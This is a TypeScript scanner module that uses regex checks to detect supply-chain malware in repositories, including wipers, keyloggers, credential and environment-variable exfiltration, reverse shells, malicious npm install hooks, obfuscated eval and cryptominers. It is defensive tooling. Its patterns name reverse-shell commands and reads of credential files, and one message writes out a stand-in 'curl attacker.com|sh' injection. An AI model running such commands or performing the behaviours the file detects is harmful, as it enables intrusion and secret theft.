/**
 * Supply chain and malicious code detection — catches repo poisoning, keyloggers,
 * destructive payloads, backdoors, and exfiltration patterns that a bad actor
 * would embed to compromise developer workstations or CI/CD pipelines.
 * CWE references per MITRE CWE catalog; ATT&CK techniques per MITRE ATT&CK v15.
 */
import { Finding, sanitizeErrorMessage } from "../result.js";
import { searchRepo } from "../../repo/search.js";

const NON_CODE_RE = /\.(?:md|json|yaml|yml|txt|rst|toml|lock)$/i;

type Hit = { file: string; line: number; preview: string };

function toEvidence(hits: Hit[]): string[] {
  return hits.slice(0, 10).map((m) => `${m.file}:${m.line}:${m.preview}`);
}
function toFiles(hits: Hit[]): string[] {
  return [...new Set(hits.slice(0, 10).map((m) => m.file))];
}

async function allSearch(query: string): Promise<Hit[]> {
  return (await searchRepo({ query, isRegex: true, maxMatches: 200 }));
}

async function codeSearch(query: string): Promise<Hit[]> {
  return (await allSearch(query)).filter((h) => !NON_CODE_RE.test(h.file));
}

async function checkDestructiveCommands(): Promise<Finding | null> {
  const hitsA = await codeSearch(
    String.raw`(?:exec|execSync|spawn|spawnSync|child_process)\s*[^;]*(?:rm\s+-rf|rm\s+--force|shred\s+-|dd\s+if=\/dev\/zero|wipefs|truncate\s+-s\s+0|>\s*\/dev\/sd)`
  );
  const hitsB = await codeSearch(
    String.raw`fs\.(?:rm|rmdir|unlink|writeFile|truncate)\s*\([^)]*(?:__dirname|process\.cwd\(\)|recursive\s*:\s*true)`
  );
  const hits = [...hitsA, ...hitsB];
  if (!hits.length) return null;
  return {
    id: "DESTRUCTIVE_COMMAND",
    title: "Destructive filesystem command detected — potential wiper malware or repo poisoning (CWE-73 / ATT&CK T1485)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Immediately audit this code path. Recursive deletion or filesystem wipe commands are not expected in application code.",
      "ATT&CK T1485 (Data Destruction) — wiper malware and supply chain attacks use rm -rf or filesystem truncation to destroy developer workstations and CI environments.",
      "Remove or gate behind explicit human confirmation with a non-destructive default. Never auto-execute recursive deletion."
    ]
  };
}

async function checkKeyloggerPatterns(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:addEventListener\s*\(\s*['"]key(?:down|up|press)['"]|onkeydown\s*=|onkeyup\s*=|onkeypress\s*=)[^}]*(?:fetch|XMLHttpRequest|axios|sendBeacon|WebSocket|navigator\.sendBeacon)`
  );
  if (!hits.length) return null;
  return {
    id: "KEYLOGGER_EXFIL",
    title: "Keystroke listener combined with network exfiltration — keylogger pattern (CWE-200 / ATT&CK T1056.001)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "This pattern captures keystrokes and sends them to a remote endpoint — a classic keylogger. Remove immediately.",
      "ATT&CK T1056.001 — keyloggers in frontend code silently steal passwords, PINs, and sensitive form inputs.",
      "Audit the event listener to confirm it serves a legitimate purpose (e.g., keyboard shortcuts) and does NOT transmit key data externally."
    ]
  };
}

async function checkCredentialExfiltration(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:localStorage|sessionStorage|document\.cookie|indexedDB)[^;]*(?:fetch|XMLHttpRequest|axios|sendBeacon)\s*\(\s*['"][^'"]*(?:http|https|ftp|ws)`
  );
  if (!hits.length) return null;
  return {
    id: "CREDENTIAL_EXFILTRATION",
    title: "Client-side storage read combined with external HTTP request — credential theft pattern (CWE-312 / ATT&CK T1555)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Code that reads from localStorage/sessionStorage/cookies and immediately sends the data to an external URL is a credential skimmer.",
      "ATT&CK T1555 — attackers inject this pattern via supply chain compromise or XSS to steal session tokens and credentials.",
      "Verify this code is not embedded by a malicious dependency. Check SRI hashes and diff against known-good versions."
    ]
  };
}

async function checkReverseShellPatterns(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:net\.createConnection|net\.connect|dgram\.createSocket)[^}]*(?:spawn|exec|shell)|(?:bash\s+-i|sh\s+-i|nc\s+-e|ncat\s+-e|\/bin\/(?:bash|sh)\s+[<>]&)|(?:child_process|exec|spawn)[^;]*(?:\/bin\/(?:bash|sh)|cmd\.exe|powershell)`
  );
  if (!hits.length) return null;
  return {
    id: "REVERSE_SHELL",
    title: "Reverse shell pattern detected — remote code execution backdoor (CWE-78 / ATT&CK T1059)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "CRITICAL: Reverse shell code provides a remote attacker with full shell access to the host system.",
      "ATT&CK T1059 — this is a common technique in supply chain compromises (e.g., event-stream, node-ipc incidents).",
      "Remove immediately. Audit all recently updated dependencies for similar patterns. Rotate all credentials on affected hosts."
    ]
  };
}

async function checkEnvExfiltration(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`process\.env[^;]*(?:fetch|axios|http(?:s)?\.(?:get|request|post)|XMLHttpRequest|got\s*\(|needle|superagent)\s*\(\s*['"](?:https?|ftp|ws)`
  );
  if (!hits.length) return null;
  return {
    id: "ENV_VARIABLE_EXFILTRATION",
    title: "process.env contents sent to external URL — environment variable exfiltration (CWE-200 / ATT&CK T1552.001)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Environment variables contain API keys, database passwords, and secrets. Sending them to an external URL is a supply chain attack.",
      "ATT&CK T1552.001 — exfiltrating process.env is a signature technique in npm package poisoning (e.g., malicious postinstall scripts).",
      "Identify whether this is in production code or a dependency. If in a dependency, treat as compromised and rotate all secrets immediately."
    ]
  };
}

async function checkMaliciousPostinstall(): Promise<Finding | null> {
  const hits = await allSearch(
    String.raw`"(?:postinstall|preinstall|install|prepare)"\s*:\s*"[^"]*(?:curl|wget|bash|sh|powershell|python|node\s+-e|eval\(|fetch|http)`
  );
  if (!hits.length) return null;
  return {
    id: "MALICIOUS_POSTINSTALL",
    title: "npm lifecycle script executes network command — supply chain backdoor vector (CWE-494 / ATT&CK T1195.002)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "postinstall scripts that download and execute code are a primary vector for npm supply chain attacks.",
      "ATT&CK T1195.002 — attackers hijack popular packages and add postinstall hooks that download malware.",
      "Remove this lifecycle script. If required for native binaries, pin the download URL and verify a SHA-256 hash."
    ]
  };
}

async function checkDynamicRequire(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`require\s*\(\s*(?:req\.|body\.|params\.|query\.|process\.env\.[^)]+|\$\{[^}]+\})`
  );
  if (!hits.length) return null;
  return {
    id: "DYNAMIC_REQUIRE",
    title: "require() called with a non-literal specifier — dynamic module loading risk (CWE-706 / ATT&CK T1059.007)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "require() with a computed string allows loading arbitrary modules or files controlled by user input.",
      "CWE-706 / ATT&CK T1059.007 — an attacker controlling the specifier can load ../../.env or a malicious module.",
      "Fix: Use a static allowlist of module names; validate against it before calling require(allowlist[key])."
    ]
  };
}

async function checkBase64ObfuscatedPayload(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:Buffer\.from\s*\(\s*['"][A-Za-z0-9+/]{40,}={0,2}['"]\s*,\s*['"]base64['"]|atob\s*\(\s*['"][A-Za-z0-9+/]{40,}={0,2}['"]\s*\))[^;]*(?:eval|exec|spawn|Function\s*\(|new Function)`
  );
  if (!hits.length) return null;
  return {
    id: "BASE64_OBFUSCATED_EXEC",
    title: "Base64-encoded payload decoded and executed — obfuscated malware pattern (CWE-95 / ATT&CK T1027)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Decoding a long base64 string and passing it to eval/exec/spawn is a canonical malware obfuscation technique.",
      "ATT&CK T1027 — obfuscated payloads evade simple static analysis and can execute any OS command or JavaScript.",
      "Remove immediately. Decode the payload to understand what it executes, then treat the host as potentially compromised."
    ]
  };
}

async function checkCryptoMining(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:CoinHive|coinhive|cryptonight|stratum\+tcp|minero|xmrig|monero|wasm-miner|coinimp|webminepool|jsecoin|deepMiner|minecrunch|cryptoloot)`
  );
  if (!hits.length) return null;
  return {
    id: "CRYPTOMINER_DETECTED",
    title: "Cryptomining library or stratum endpoint reference detected — unauthorized resource use (ATT&CK T1496)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Cryptomining code abuses the user's CPU/GPU without consent and is categorically unauthorized in application code.",
      "ATT&CK T1496 — resource hijacking for cryptomining is a common objective in supply chain compromises.",
      "Remove immediately. Audit the full dependency tree for the source of this reference."
    ]
  };
}

async function checkSensitiveFileAccess(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:fs\.(?:readFile|readFileSync|createReadStream))\s*\([^)]*(?:\/etc\/passwd|\/etc\/shadow|\/etc\/hosts|~\/\.ssh|\.ssh\/id_rsa|\.env|\.aws\/credentials|\.npmrc|\.netrc|\/proc\/self)`
  );
  if (!hits.length) return null;
  return {
    id: "SENSITIVE_FILE_ACCESS",
    title: "Direct read of sensitive system files — credential theft or reconnaissance (CWE-552 / ATT&CK T1552)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Reading /etc/passwd, ~/.ssh/id_rsa, .aws/credentials, or .env in application code is almost always malicious.",
      "ATT&CK T1552 — attackers read system credentials and configuration files to escalate privileges or exfiltrate secrets.",
      "Remove immediately. If any legitimate use exists (e.g., reading own .env), use a safe library like dotenv with a project-relative path."
    ]
  };
}

async function checkUnsafePinnedVersion(): Promise<Finding | null> {
  const hits = await allSearch(
    String.raw`"(?:dependencies|devDependencies|peerDependencies)"\s*:\s*\{[^}]*"[^"]+"\s*:\s*"(?:\*|latest|next|x|>=\s*0\.0\.0)"`
  );
  if (!hits.length) return null;
  return {
    id: "UNPINNED_DEPENDENCY_VERSION",
    title: "Dependency version pinned to '*', 'latest', or open range — supply chain compromise vector (CWE-1357)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Floating version ranges allow a malicious package release to be automatically installed on the next npm install.",
      "CWE-1357 / ATT&CK T1195.002 — supply chain attacks like event-stream exploit unpinned dependency versions.",
      "Pin all dependencies to exact versions. Use a lock file (package-lock.json or yarn.lock) and enable Dependabot alerts."
    ]
  };
}

async function checkProcessExitWithWipe(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:fs\.(?:rm|rmdir|unlink|writeFile|truncate)|exec(?:Sync)?|spawn(?:Sync)?)[^;]*(?:process\.exit|os\.exit)|process\.exit[^;]*(?:fs\.rm|fs\.unlink|rm\s+-rf|del\s+\/)`
  );
  if (!hits.length) return null;
  return {
    id: "EXIT_WITH_DESTRUCTION",
    title: "process.exit() combined with filesystem deletion — wiper or anti-forensics pattern (ATT&CK T1485 / T1070)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Combining process exit with file deletion is a classic anti-forensics technique used in destructive malware.",
      "ATT&CK T1485 (Data Destruction) + T1070 (Indicator Removal) — wipers terminate the process after erasing logs or data.",
      "Remove this pattern immediately. Legitimate cleanup should use 'finally' blocks, not exit-triggered deletion."
    ]
  };
}

async function checkHiddenFileWrite(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`fs\.(?:writeFile|writeFileSync|appendFile|appendFileSync|createWriteStream)\s*\(\s*['"]\.[./]*(?!env|npmrc|gitignore|eslintrc|prettierrc)[a-zA-Z_-]{1,30}['"]`
  );
  if (!hits.length) return null;
  return {
    id: "HIDDEN_FILE_WRITE",
    title: "Writing to a hidden dotfile (non-standard) — file system hiding or persistence mechanism (ATT&CK T1564.001)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Writing to hidden files (e.g., .update, .cache, .x) is a persistence and concealment technique used by malware.",
      "ATT&CK T1564.001 — attackers store payloads or configuration in hidden files to evade detection.",
      "Review this write. If legitimate (e.g., lock files), use a non-hidden path and document the purpose."
    ]
  };
}

async function checkDnsExfiltration(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`dns\.(?:resolve|lookup|resolve4|resolve6|resolveTxt)\s*\([^)]*(?:process\.env|btoa|Buffer\.from[^)]*base64|encodeURIComponent|\.replace)\s*\(`
  );
  if (!hits.length) return null;
  return {
    id: "DNS_EXFILTRATION",
    title: "DNS lookup with encoded/derived hostname — DNS exfiltration channel (ATT&CK T1048.003 / CWE-200)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Constructing DNS lookup hostnames from encoded environment variables or secrets is a data exfiltration technique.",
      "ATT&CK T1048.003 — DNS exfiltration bypasses HTTP-level egress controls and is hard to detect in logs.",
      "Remove immediately. DNS lookups should use static, hardcoded hostnames — never derived from secrets or user data."
    ]
  };
}

async function checkClipboardMonitoring(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:navigator\.clipboard\.read|document\.execCommand\s*\(\s*['"]paste['"]|clipboardData\.getData)[^}]*(?:fetch|XMLHttpRequest|sendBeacon|WebSocket|axios)`
  );
  if (!hits.length) return null;
  return {
    id: "CLIPBOARD_EXFILTRATION",
    title: "Clipboard contents read and transmitted to external endpoint — credential theft pattern (ATT&CK T1115 / CWE-200)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Reading clipboard contents and sending them to a remote URL is a credential/password skimmer technique.",
      "ATT&CK T1115 — attackers target password managers and developer tools that use the clipboard for secrets.",
      "Remove immediately. Legitimate clipboard use (copy/paste UX) never sends clipboard data to a server."
    ]
  };
}

async function checkObfuscatedScriptInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:document\.write|innerHTML\s*\+=|insertAdjacentHTML)\s*\([^)]*(?:atob|unescape|String\.fromCharCode|\\x[0-9a-f]{2}|\\u[0-9a-f]{4})`
  );
  if (!hits.length) return null;
  return {
    id: "OBFUSCATED_DOM_INJECTION",
    title: "Obfuscated payload injected into DOM — encoded script injection (CWE-79 / ATT&CK T1027)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Injecting obfuscated content (base64-decoded, hex-encoded, or char-code assembled) into the DOM is a web skimmer technique.",
      "ATT&CK T1027 — encoding hides malicious scripts from simple string searches and CSP bypass attempts.",
      "Remove immediately. All DOM-inserted content must be static or sanitized; never built from encoded strings."
    ]
  };
}

// ─── New gate checks (10 targeted supply-chain patterns) ──────────────────────

/**
 * CWE-95: eval() called with a dynamic or user-controlled argument.
 * Excludes eval() calls where the sole argument is a string literal.
 */
async function checkEvalDynamicArg(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`\beval\s*\(\s*(?!['"` + "`" + String.raw`])[^)]+\)`
  );
  // Exclude lines where eval's argument is a plain string literal (no variables/expressions).
  const unsafe = hits.filter(
    (h) => !/\beval\s*\(\s*['"`][^'"`]*['"`]\s*\)/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "EVAL_DYNAMIC_ARG",
    title: "eval() called with a dynamic or user-controlled argument — arbitrary code execution (CWE-95)",
    severity: "CRITICAL",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Remove eval() entirely. Use JSON.parse() for data, static import() for modules, or a purpose-built expression parser.",
      "CWE-95 / ATT&CK T1059.007 — eval() with user input enables full JavaScript RCE inside the process.",
      "If a REPL is required, sandbox with vm.runInNewContext() and a strict resource-limited context object."
    ]
  };
}

/**
 * CWE-95: require() called with a computed (non-literal) string specifier.
 * Catches template literals and variable references, not plain string literals.
 * Complements the existing checkDynamicRequire which only covers req./body. prefixes.
 */
async function checkRequireNonLiteral(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`\brequire\s*\(\s*(?:[a-zA-Z_$][a-zA-Z0-9_$]*\b|` + "`" + String.raw`[^` + "`" + String.raw`]*\$\{)`
  );
  // Safe: require('literal') or require("literal") — static strings only.
  const unsafe = hits.filter(
    (h) => !/\brequire\s*\(\s*['"][^'"]+['"]\s*\)/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "REQUIRE_NON_LITERAL",
    title: "require() called with a non-literal specifier — dynamic module loading (CWE-95 / CWE-706)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Replace dynamic require() with a static allowlist: const mods = { a: require('./a'), b: require('./b') }; use mods[key].",
      "CWE-95 / ATT&CK T1059.007 — an attacker controlling the specifier can load ../../.env or any file on disk.",
      "Enable --experimental-require-module tree shaking at build time to make dynamic require detectable at the bundler level."
    ]
  };
}

/**
 * CWE-706: dynamic import() with a computed specifier (not a string literal).
 */
async function checkDynamicImportNonLiteral(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`\bimport\s*\(\s*(?:[a-zA-Z_$][a-zA-Z0-9_$.]*|\$\{|` + "`" + String.raw`[^` + "`" + String.raw`]*\$\{)`
  );
  // Safe pattern: import('literal') — static string specifier.
  const unsafe = hits.filter(
    (h) => !/\bimport\s*\(\s*['"][^'"]+['"]\s*\)/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "DYNAMIC_IMPORT_NON_LITERAL",
    title: "dynamic import() with a non-literal specifier — module injection risk (CWE-706)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Use a static mapping of allowlisted specifiers; validate the key before passing to import().",
      "CWE-706 / ATT&CK T1059.007 — a controlled specifier can load arbitrary local paths or installed packages.",
      "Fix: const ALLOWED = { pdf: () => import('./pdf.js') }; await ALLOWED[type]?.() ?? raiseError();"
    ]
  };
}

/**
 * npm lifecycle scripts executing user-controlled or shell-interpolated input (CWE-78).
 * Looks for lifecycle values that contain shell variable expansion or subshell syntax.
 */
async function checkLifecycleScriptUserInput(): Promise<Finding | null> {
  const hits = await allSearch(
    String.raw`"(?:postinstall|preinstall|install|prepare|pretest|test|start|build)"\s*:\s*"[^"]*(?:\$\{|\$[A-Z_][A-Z0-9_]*|\$\(|` + "`" + String.raw`[^` + "`" + String.raw`]*` + "`" + String.raw`)"`
  );
  if (!hits.length) return null;
  return {
    id: "LIFECYCLE_SCRIPT_USER_INPUT",
    title: "npm lifecycle script contains shell variable or subshell expansion — user-controlled execution risk (CWE-78)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Lifecycle scripts that interpolate environment variables or subshells can be exploited via crafted env values in CI or developer environments.",
      "CWE-78 / ATT&CK T1195.002 — a compromised CI env var (e.g., NODE_ENV=$(curl attacker.com|sh)) achieves RCE at install time.",
      "Replace shell variable interpolation with a dedicated Node.js build script that reads env vars safely via process.env."
    ]
  };
}

/**
 * Postinstall script that makes network requests — supply chain exfiltration (CWE-494 / ATT&CK T1195.002).
 * More targeted than checkMaliciousPostinstall: focuses specifically on postinstall + network fetch keywords.
 */
async function checkPostinstallNetworkRequest(): Promise<Finding | null> {
  const hits = await allSearch(
    String.raw`"postinstall"\s*:\s*"[^"]*(?:fetch|https?:|curl|wget|axios|got|request|node-fetch)"`
  );
  if (!hits.length) return null;
  return {
    id: "POSTINSTALL_NETWORK_REQUEST",
    title: "postinstall script makes a network request — supply chain exfiltration vector (CWE-494 / ATT&CK T1195.002)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "A postinstall hook that fetches remote content runs automatically on every 'npm install' in every consumer project.",
      "CWE-494 / ATT&CK T1195.002 — this is the exact technique used in the event-stream and node-ipc supply chain attacks.",
      "Remove the postinstall network call. Bundle all required assets; if native binaries are needed, verify a SHA-256 checksum against a pinned value."
    ]
  };
}

/**
 * CWE-1357: package.json dependency pinned to * or "latest" — floating version.
 * Extends checkUnsafePinnedVersion with a file-scoped line-level search.
 */
async function checkWildcardDependencyVersion(): Promise<Finding | null> {
  const hits = await allSearch(
    String.raw`"[a-zA-Z@][^"]{0,100}"\s*:\s*"(?:\*|latest|x\.x\.x|>=0\.0\.0)"`
  );
  // Restrict to package.json files only.
  const pkgHits = hits.filter((h) => h.file.endsWith("package.json"));
  if (!pkgHits.length) return null;
  return {
    id: "WILDCARD_DEPENDENCY_VERSION",
    title: "package.json dependency version is '*' or 'latest' — supply chain compromise vector (CWE-1357)",
    severity: "HIGH",
    evidence: toEvidence(pkgHits),
    files: toFiles(pkgHits),
    requiredActions: [
      "Floating version ranges allow a malicious package release to auto-install on the next 'npm install'.",
      "CWE-1357 / ATT&CK T1195.002 — the event-stream attack exploited an unpinned transitive dependency.",
      "Pin to an exact semver (e.g., '1.2.3'). Commit package-lock.json and enable automated vulnerability alerts via Dependabot or Socket.dev."
    ]
  };
}

/**
 * CWE-494: .npmrc registry pointing to a non-HTTPS or unknown/untrusted source.
 */
async function checkNpmrcUntrustedRegistry(): Promise<Finding | null> {
  const hits = await allSearch(
    String.raw`registry\s*=\s*(?!https://registry\.npmjs\.org)(?!https://registry\.yarnpkg\.com)http`
  );
  // Restrict to .npmrc files.
  const npmrcHits = hits.filter((h) => h.file.endsWith(".npmrc"));
  if (!npmrcHits.length) return null;
  return {
    id: "NPMRC_UNTRUSTED_REGISTRY",
    title: ".npmrc registry set to a non-HTTPS or non-official source — dependency confusion / MitM risk (CWE-494)",
    severity: "HIGH",
    evidence: toEvidence(npmrcHits),
    files: toFiles(npmrcHits),
    requiredActions: [
      "An HTTP (non-TLS) registry allows a network MitM to serve malicious packages without detection.",
      "CWE-494 / ATT&CK T1195.002 — dependency confusion attacks rely on misconfigured or private registries.",
      "Set registry=https://registry.npmjs.org (or your private Artifactory/Nexus over HTTPS). Never use http:// for package registries."
    ]
  };
}

/**
 * CWE-78: child_process exec/execSync called with a string argument (shell interpolation)
 * or with shell:true. Complements injection-deep's checkCommandInjection with a focus
 * on the explicit node:child_process import and shell:true option.
 */
async function checkChildProcessExecShell(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:exec|execSync)\s*\(\s*(?:[`+"`"+String.raw`'"][^`+"`"+String.raw`'"]*\$\{|[a-zA-Z_$][a-zA-Z0-9_$.]*\s*[+,])|shell\s*:\s*true`
  );
  // Safe: execFile() with array args — excludes those lines.
  const unsafe = hits.filter(
    (h) => !/execFile\s*\([^,]+,\s*\[/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "CHILD_PROCESS_EXEC_SHELL",
    title: "child_process exec/execSync with shell:true or string interpolation — OS command injection (CWE-78)",
    severity: "CRITICAL",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "exec() and execSync() pass arguments through /bin/sh when given a string — any embedded metacharacter achieves RCE.",
      String.raw`CWE-78 / ATT&CK T1059.004 — shell:true on spawn is equally dangerous; metacharacters like ; | $() \n break argument boundaries.`,
      "Fix: replace with execFile('/path/to/binary', [arg1, arg2], { shell: false }) — never concatenate user input into a shell string."
    ]
  };
}

/**
 * CWE-327: crypto.createHash or createCipher using MD5 or SHA-1 for security purposes.
 * Excludes non-security uses (content-addressable caching comments).
 */
async function checkWeakCryptoHash(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`crypto\.(?:createHash|createCipher|createCipheriv)\s*\(\s*['"](?:md5|sha1|sha-1|MD5|SHA1|SHA-1)['"]`
  );
  // Exclude lines that are explicitly annotated as non-security / cache / checksum use.
  const unsafe = hits.filter(
    (h) => !/(?:cache|etag|content.address|checksum|non.?security|integrity.check|dedup)/i.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "WEAK_CRYPTO_HASH",
    title: "MD5 or SHA-1 used in crypto.createHash/createCipher — broken hash algorithm (CWE-327)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "MD5 and SHA-1 are cryptographically broken — collision attacks are practical and documented (Shattered, SLOTH).",
      "CWE-327 / ATT&CK T1600 — weak hashes used for password storage, HMAC, or digital signature allow forgery.",
      "Replace with crypto.createHash('sha256') for integrity, scrypt/argon2 for passwords, and AES-256-GCM for symmetric encryption."
    ]
  };
}

/**
 * CWE-1188: Hardcoded IP addresses in production code.
 * Catches IPv4 addresses that appear as string literals, excluding loopback,
 * private RFC-1918 docs ranges (192.0.2.x, 198.51.100.x, 203.0.113.x) and 0.0.0.0.
 */
async function checkHardcodedIpAddress(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`['"\`](?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)['"\`]`
  );
  // Exclude loopback (127.x), unspecified (0.0.0.0), and documentation ranges.
  const unsafe = hits.filter((h) => {
    const m = /['"`]((?:\d{1,3}\.){3}\d{1,3})['"`]/.exec(h.preview);
    if (!m) return false;
    const ip = m[1];
    if (ip.startsWith("127.")) return false;         // loopback
    if (ip === "0.0.0.0") return false;              // unspecified / bind-all
    if (ip.startsWith("192.0.2.")) return false;     // TEST-NET-1
    if (ip.startsWith("198.51.100.")) return false;  // TEST-NET-2
    if (ip.startsWith("203.0.113.")) return false;   // TEST-NET-3
    return true;
  });
  if (!unsafe.length) return null;
  return {
    id: "HARDCODED_IP_ADDRESS",
    title: "Hardcoded IP address in production code — infrastructure coupling and reconnaissance aid (CWE-1188)",
    severity: "MEDIUM",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Hardcoded IPs expose internal topology, break across environments, and become stale without code changes.",
      "CWE-1188 / ATT&CK T1592.002 — exposed IPs aid attacker reconnaissance and pivot targeting.",
      "Replace with environment variables (process.env.SERVICE_HOST) or DNS names resolved at runtime. Use 0.0.0.0 for bind addresses."
    ]
  };
}

export async function checkSupplyChainDeep(_opts: { changedFiles: string[] }): Promise<Finding[]> {
  try {
    const results = await Promise.all([
      checkDestructiveCommands(),
      checkKeyloggerPatterns(),
      checkCredentialExfiltration(),
      checkReverseShellPatterns(),
      checkEnvExfiltration(),
      checkMaliciousPostinstall(),
      checkDynamicRequire(),
      checkBase64ObfuscatedPayload(),
      checkCryptoMining(),
      checkSensitiveFileAccess(),
      checkUnsafePinnedVersion(),
      checkProcessExitWithWipe(),
      checkHiddenFileWrite(),
      checkDnsExfiltration(),
      checkClipboardMonitoring(),
      checkObfuscatedScriptInjection(),
      // ── New targeted supply-chain checks ──
      checkEvalDynamicArg(),
      checkRequireNonLiteral(),
      checkDynamicImportNonLiteral(),
      checkLifecycleScriptUserInput(),
      checkPostinstallNetworkRequest(),
      checkWildcardDependencyVersion(),
      checkNpmrcUntrustedRegistry(),
      checkChildProcessExecShell(),
      checkWeakCryptoHash(),
      checkHardcodedIpAddress(),
    ]);
    return results.filter((f): f is Finding => f !== null);
  } catch (err) {
    console.warn("[checkSupplyChainDeep] Internal error:", sanitizeErrorMessage(err instanceof Error ? err.message : String(err)));
    return [];
  }
}
